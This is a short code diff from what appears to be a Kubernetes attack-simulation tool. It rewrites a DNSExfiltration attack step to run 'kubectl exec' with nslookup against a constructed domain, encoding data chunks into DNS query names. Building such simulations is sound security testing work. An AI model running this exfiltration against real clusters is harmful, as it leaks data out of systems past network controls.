@@ -1,4 +1,5 @@
 import asyncio
+import subprocess
 from kubernetes import client
 from kubernetes.client.rest import ApiException
 from .base import BaseAttack, AttackSeverity
@@ -103,14 +104,15 @@ class DNSExfiltration(BaseAttack):
                         await asyncio.sleep(1)
 
                     try:
-                        result = api.connect_get_namespaced_pod_exec(
-                            "dns-exfil-pod", namespace,
-                            command=["sh", "-c", f"nslookup {domain} 2>&1 || host {domain} 2>&1 || echo 'DNS resolution attempted'"],
-                            stderr=True, stdin=False, stdout=True, tty=False,
+                        result = subprocess.run(
+                            ["kubectl", "exec", "dns-exfil-pod", "-n", namespace,
+                             "--", "sh", "-c", f"nslookup {domain} 2>&1 || host {domain} 2>&1 || echo 'DNS resolution attempted'"],
+                            capture_output=True, text=True, timeout=15,
                         )
+                        output = (result.stdout or result.stderr)[:300]
                         self.cmd_event_sync(
                             f"kubectl exec dns-exfil-pod -n {namespace} -- nslookup {domain}",
-                            result[:300] if result else "(no output)",
+                            output or "(no output)",
                             f"DNS exfiltration query: {domain[:40]}..."
                         )
                         encoded_chunk = domain.split('.')[0]
